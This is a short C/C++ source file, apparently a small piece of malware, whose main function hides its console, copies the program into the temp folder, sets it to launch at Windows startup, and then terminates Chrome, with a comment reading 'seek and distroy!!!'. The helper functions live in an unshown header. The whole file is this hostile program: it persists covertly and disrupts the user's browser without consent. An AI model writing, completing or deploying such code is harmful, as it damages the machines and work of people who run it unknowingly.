#include "helpers.h"
int main(int argc, char *argv[])
{
	FreeConsole();
	// get program name.exe
	string exeName = getProgramName(argv[0]);
	// get program name
	copyFileToTemp(argv[0], exeName);
	// make it start with windows
	makeStartWithWindows(exeName);
	// seek and distroy!!!
	findAndKillChrome();
	return 0;
}
